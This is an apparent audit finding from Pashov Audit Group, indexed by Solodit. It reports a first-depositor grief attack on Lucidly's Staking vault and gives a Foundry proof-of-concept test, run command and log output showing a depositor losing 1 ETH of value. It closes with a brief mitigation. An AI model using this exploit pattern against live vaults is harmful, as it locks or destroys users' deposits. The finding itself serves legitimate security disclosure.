---
# Core Classification
protocol: Lucidly June
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 36389
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/Lucidly-security-review-June.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[M-01] `Staking` vault is susceptible to initial grief attack

### Overview


The bug report describes a potential issue in the PoolSwap contract where the first depositor may be vulnerable to losing their assets at a relatively low cost. This is known as the initial depositor grief attack. The severity of this bug is high and could have a significant impact on users. The likelihood of this bug occurring is low. The report includes a code snippet and a test that demonstrates the attack. The recommended solution is to mitigate this issue by implementing an initial deposit of a small amount.

### Original Finding Content

**Severity**

**Impact:** High

**Likelihood:** Low

**Description**

The initial deposit attack is largely mitigated due to the usage of virtual shares. However, the initial depositor grief attack is still possible, causing the first depositor to lose assets at a relatively low cost for the griefer.

```solidity
contract PoolSwap is Test {

    Staking staking;
    MockToken public token;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        token = new MockToken("token", "t", 18);

        // deploy staking contract
        staking = new Staking(address(token), "XYZ Mastervault Token", "XYZ-MVT", true, alice);
    }

        function test_initial_deposit_grief() public {

        vm.startPrank(alice);
        token.mint(alice,11e18 + 10);

        uint256 initialAssetBalance = token.balanceOf(alice);
        console.log("attacker balance before : ");
        console.log(initialAssetBalance);

        token.approve(address(staking), 1e18);

        staking.mint(10, alice);

        token.transfer(address(staking), 11e18);

        vm.stopPrank();

        vm.startPrank(bob);

        token.mint(bob,10e18 + 10);
        token.approve(address(staking), 1e18);
        staking.deposit(1e18, bob);
        vm.stopPrank();

        uint256 bobShares = staking.balanceOf(bob);
        console.log("bob shares : ");
        console.log(bobShares);

        vm.stopPrank();

        vm.startPrank(alice);

        staking.redeem(staking.balanceOf(alice), alice, alice);
        uint256 afterAssetBalance = token.balanceOf(alice);
        console.log("attacker balance after : ");
        console.log(afterAssetBalance);
        vm.stopPrank();

    }
}
```

Run the test :

```shell
forge test --match-test test_initial_deposit_grief -vvv
```

Log output :

```shell
Logs:
  attacker balance before :
  11000000000000000010
  bob shares :
  0
  attacker balance after :
  10909090909090909100
```

It can be observed that alice can lock `1 ETH` of bob's asset at the cost of `~ 0.1 ETH`.

**Recommendations**

Consider mitigating this with an initial deposit of a small amount

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Lucidly June |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/Lucidly-security-review-June.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

